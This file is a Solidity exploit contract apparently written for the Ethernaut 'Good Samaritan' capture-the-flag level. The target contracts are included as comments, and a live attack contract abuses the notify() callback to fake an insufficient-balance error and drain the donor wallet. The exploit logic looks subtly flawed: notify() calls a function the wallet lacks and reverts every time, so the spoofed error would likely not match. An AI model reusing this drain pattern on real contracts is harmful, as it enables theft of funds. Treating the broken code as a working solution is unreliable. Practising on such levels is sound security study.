/**
 *Submitted for verification at Etherscan.io on 2022-09-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// contract GoodSamaritan {
//     Wallet public wallet;
//     Coin public coin;

//     constructor() {
//         wallet = new Wallet();
//         coin = new Coin(address(wallet));

//         wallet.setCoin(coin);
//     }

//     // 请求货币
//     function requestDonation() external returns(bool enoughBalance){
//         // donate 10 coins to requester
//         try wallet.donate10(msg.sender) {
//             return true;
//         } catch (bytes memory err) {
//             if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
//                 // send the coins left
//                 wallet.transferRemainder(msg.sender);
//                 return false;
//             }
//         }
//     }
// }

// contract Coin {
//     using Address for address;

//     mapping(address => uint256) public balances;

//     error InsufficientBalance(uint256 current, uint256 required);

//     constructor(address wallet_) {
//         // one million coins for Good Samaritan initially
//         balances[wallet_] = 10**6;
//     }

//     function transfer(address dest_, uint256 amount_) external {
//         uint256 currentBalance = balances[msg.sender];

//         // transfer only occurs if balance is enough
//         if(amount_ <= currentBalance) {
//             balances[msg.sender] -= amount_;
//             balances[dest_] += amount_;

//             if(dest_.isContract()) {
//                 // notify contract 
//                 INotifyable(dest_).notify(amount_);
//             }
//         } else {
//             revert InsufficientBalance(currentBalance, amount_);
//         }
//     }
// }

// contract Wallet {
//     // The owner of the wallet instance
//     address public owner;

//     Coin public coin;

//     error OnlyOwner();
//     error NotEnoughBalance();

//     modifier onlyOwner() {
//         if(msg.sender != owner) {
//             revert OnlyOwner();
//         }
//         _;
//     }

//     constructor() {
//         owner = msg.sender;
//     }

//     function donate10(address dest_) external onlyOwner {
//         // check balance left
//         if (coin.balances(address(this)) < 10) {
//             revert NotEnoughBalance();
//         } else {
//             // donate 10 coins
//             coin.transfer(dest_, 10);
//         }
//     }

//     function transferRemainder(address dest_) external onlyOwner {
//         // transfer balance left
//         coin.transfer(dest_, coin.balances(address(this)));
//     }

//     function setCoin(Coin coin_) external onlyOwner {
//         coin = coin_;
//     }
// }

interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

interface IWallet {
    function NotEnoughBalance() external;
}

contract CTEGoodSamaritan is INotifyable {
    
    bytes public errMessage;
    address public addrGoodS;
    address public addrWallet;

    error Attack(bytes err);

    function notify(uint256 amount) external override{
        errMessage = abi.encodeWithSignature("NotEnoughBalance()");
        // revert Attack(errMessage);
        IWallet(addrWallet).NotEnoughBalance();
    }

    function setGsWa(address addrGs, address addrWa) public {
        addrGoodS = addrGs;
        addrWallet = addrWa;
    }

    function attack() public {
        IGoodSamaritan(addrGoodS).requestDonation();
    }


}